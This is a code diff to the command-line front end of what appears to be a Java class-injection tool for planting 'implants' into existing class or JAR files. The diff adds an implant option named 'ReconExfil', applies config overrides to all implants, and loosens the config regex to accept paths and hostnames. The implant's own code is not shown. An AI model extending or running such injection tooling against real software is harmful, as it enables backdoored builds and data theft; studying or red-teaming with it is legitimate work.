@@ -3,10 +3,7 @@ package org.example;
 import net.sourceforge.argparse4j.ArgumentParsers;
 import net.sourceforge.argparse4j.impl.Arguments;
 import net.sourceforge.argparse4j.inf.*;
-import org.example.implants.ClassImplant;
-import org.example.implants.ImplantInfo;
-import org.example.implants.SpringImplantConfiguration;
-import org.example.implants.SpringImplantController;
+import org.example.implants.*;
 import org.example.injector.*;
 
 import java.io.IOException;
@@ -61,7 +58,7 @@ public class Cli {
                 .required(true);
         classInjectorParser.addArgument("--implant-class")
                 .help("Name of the class containing a custom 'init()' method and other implant logic.")
-                .choices("ClassImplant")
+                .choices("ClassImplant", "ReconExfil")
                 .setDefault("ClassImplant");
         classInjectorParser.addArgument("--config")
                 .help("Override one or more configuration properties inside the implant.")
@@ -136,27 +133,34 @@ public class Cli {
         assertNotSameFile(targetPath, outputPath);
 
         String implantClassName = namespace.getString("implant_class");
+        ImplantHandler implantHandler;
         if (implantClassName.equals("ClassImplant")) {
-            ImplantHandler implantHandler;
             try {
                 implantHandler = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
             } catch (ClassNotFoundException | IOException e) {
                 throw new RuntimeException("Cannot find built-in implant class.", e);
             }
-
-            Map<String, Object> configOverrides = parseConfigOverrides(namespace);
+        } else if (implantClassName.equals("ReconExfil")) {
             try {
-                implantHandler.setConfig(configOverrides);
-            } catch (ImplantConfigException e) {
-                System.out.println("[!] " + e.getMessage());
-                System.exit(1);
+                implantHandler = ImplantHandlerImpl.findAndCreateFor(ReconExfil.class);
+            } catch (ClassNotFoundException | IOException e) {
+                throw new RuntimeException("Cannot find built-in implant class.", e);
             }
-
-            runClassInjector(targetPath, outputPath, implantHandler);
         } else {
             System.out.println("[!] Unknown --implant-class.");
             System.exit(1);
+            throw new RuntimeException();
         }
+
+        Map<String, Object> configOverrides = parseConfigOverrides(namespace);
+        try {
+            implantHandler.setConfig(configOverrides);
+        } catch (ImplantConfigException e) {
+            System.out.println("[!] " + e.getMessage());
+            System.exit(1);
+        }
+
+        runClassInjector(targetPath, outputPath, implantHandler);
     }
 
     public static void runClassInjector(Path targetPath, Path outputPath, ImplantHandler implantHandler) {
@@ -257,7 +261,7 @@ public class Cli {
             return Collections.emptyMap();
         }
 
-        Pattern regex = Pattern.compile("^(?<key>\\w+)=(?<value>[\\w ]+)$");
+        Pattern regex = Pattern.compile("^(?<key>\\w+)=(?<value>[\\w\\\\.\\-_ ]+)$");
         for (String configArg : configArgs) {
             Matcher match = regex.matcher(configArg);
             if (!match.matches()) {
